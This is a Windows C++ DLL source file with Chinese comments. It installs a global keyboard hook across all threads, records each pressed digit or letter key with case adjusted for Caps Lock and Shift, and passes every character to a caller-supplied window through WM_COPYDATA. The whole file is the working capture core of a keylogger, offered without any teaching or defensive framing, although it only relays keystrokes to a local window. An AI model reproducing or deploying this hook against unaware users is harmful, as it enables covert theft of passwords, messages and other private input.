// dllmain.cpp : 定义 DLL 应用程序的入口点。
#include "stdafx.h"

HINSTANCE gHmodule;
HHOOK gHook;
HWND gHwnd;


LRESULT CALLBACK HookProc
(
int nCode,
WPARAM wParam,
LPARAM lParam
) {
	TCHAR buf[10] = { 0 };
	COPYDATASTRUCT Data = {0};
	if ('0' <= wParam && wParam <= 'z') {
		if (GetKeyState(wParam) & 0x8000) {//被按下执行
			if ('0' <= wParam && '9' >= wParam) {
				_stprintf(buf, _T("%c"), wParam);
			} else {
				if ((GetKeyState(VK_CAPITAL) & 1) || (GetAsyncKeyState(VK_SHIFT) & 1))
					_stprintf(buf, _T("%c"), wParam);
				else
					_stprintf(buf, _T("%c"), wParam + 32);

			}
		
			Data.dwData = _tcslen(buf) + 1;
			Data.lpData = buf;
			SendMessage(gHwnd, WM_COPYDATA, NULL, (LPARAM)&Data);

		
		}

	}
	

	
	return CallNextHookEx(gHook, nCode, wParam, lParam);
}

BOOL SetKeyBoardHook(HWND Hwnd ) {
	gHwnd = Hwnd;
	gHook = SetWindowsHookEx(WH_KEYBOARD, HookProc, gHmodule, 0);
	if (!gHook)
		return FALSE;
	return TRUE;


}

BOOL APIENTRY DllMain( HMODULE hModule,
                       DWORD  ul_reason_for_call,
                       LPVOID lpReserved
					 )
{
	
	switch (ul_reason_for_call)
	{
	case DLL_PROCESS_ATTACH:{
		//DLL装载时运行
								gHmodule = hModule;
	
	}break;
	case DLL_THREAD_ATTACH:
	case DLL_THREAD_DETACH:
	case DLL_PROCESS_DETACH:
		break;
	}
	return TRUE;
}

